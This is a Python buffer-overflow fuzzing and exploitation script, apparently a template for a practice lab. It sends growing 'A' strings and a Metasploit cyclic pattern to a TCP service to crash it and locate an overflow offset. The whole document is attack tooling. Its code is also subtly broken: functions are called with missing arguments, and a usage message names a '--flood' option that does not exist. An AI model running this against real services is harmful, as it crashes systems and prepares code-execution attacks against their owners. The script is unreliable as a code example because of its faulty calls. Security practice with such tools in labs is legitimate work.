#!/usr/bin/env python3

import argparse
import socket
import subprocess
import sys
import time

parser = argparse.ArgumentParser()
parser.add_argument('--generate-config-template',action='store_true')
parser.add_argument('--use-local-config-file',action='store_true')
parser.add_argument('--fuzz',action='store_true')
parser.add_argument('--overflow',action='store_true')
parser.add_argument('--host')
parser.add_argument('--port',type=int)
parser.add_argument('--prefix')
parser.add_argument('--length',type=int)
args = parser.parse_args()

ip = args.host
port = args.port
target = (ip,port)
timeout = 3
prefix = args.prefix

def use_local_config_file():
    import config
    if hasattr(config,'settings'):
        if type(config.settings) is dict:
            try:
                mode = config.settings['mode']
                host = config.settings['host']
                port = config.settings['port']
                prefix = config.settings['prefix']
                length = config.settings['length']
                if mode == 'fuzz':
                    fuzz()
                elif mode == 'overflow':
                    overflow(host,port,prefix,length)
            except Exception as err:
                print("[x] The %s key is missing from the settings variable." % err)
        else:
            print("[x] The settings variable is not of the dict type.")
    else:
        print("[x] The settings variable was not found in config.py.")

def generate_config_template():
    config = open("config.py","w")
    config.write("settings = {\n")
    config.write("    'mode': 'overflow',\n")
    config.write("    'host': '10.10.10.10',\n")
    config.write("    'port': 1337,\n")
    config.write("    'prefix': 'OVERFLOW1 ',\n")
    config.write("    'length': 2400,\n")
    config.write("}\n")
    config.close()
    print("[+] Created a config.py template.")
    print(open("config.py","r").read())

def connect(host,port):
    target = (host,port)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    client.settimeout(timeout)
    client.connect(target)
    client.recv(1024)
    return client

def fuzz():
    string = prefix + "A" * 100
    while True:
        try:
            with connect() as client:
                print("[*] Fuzzing with {} bytes".format(len(string) - len(prefix)))
                client.send(bytes(string, "latin-1"))
                client.recv(1024)
        except socket.error as err:
            print("[x] Failed to connect to port %d." % port)
            sys.exit(0)
        except:
            print("[!] Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
            sys.exit(0)
        
        string += "A" * 100
        time.sleep(1)

def overflow(host,port,prefix,length):
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    if subprocess.run(['which','msf-pattern_create'], stdout=subprocess.DEVNULL).returncode == 0:
        payload = subprocess.check_output(['msf-pattern_create','-l',str(length)],universal_newlines=True).rstrip()
    else:
        print("[x] msf-pattern_create not found.")
        exit()
    suffix = ""
    bof = prefix + overflow + retn + padding + payload + suffix

    try:
        client = connect(host,port)
        client.send(bytes(bof + "\r\n","latin-1"))
        client.close()
        print("[+] Sent BOF.")
        try:
            client = connect(host,port)
            client.close()
        except:
            print("[+] Tango down!")
    except:
        print("[x] Failed to connect to port %d." % port)

if __name__ == "__main__":
    if args.generate_config_template:
        generate_config_template()
    elif args.use_local_config_file:
        use_local_config_file()
    elif not args.fuzz and not args.overflow:
        print("[x] Please specify an option using either --fuzz or --flood.")
    elif not args.host:
        print("[x] Please specify a host using --host.")
    elif not args.port:
        print("[x] Please specify a port using --port.")
    elif not args.prefix:
        print("[x] Please specify a prefix using --prefix.")
    elif args.fuzz:
        fuzz()
    elif args.overflow:
        if args.length:
            overflow(args.length)
        else:
            print("[x] Please specify a pattern length using --length.")
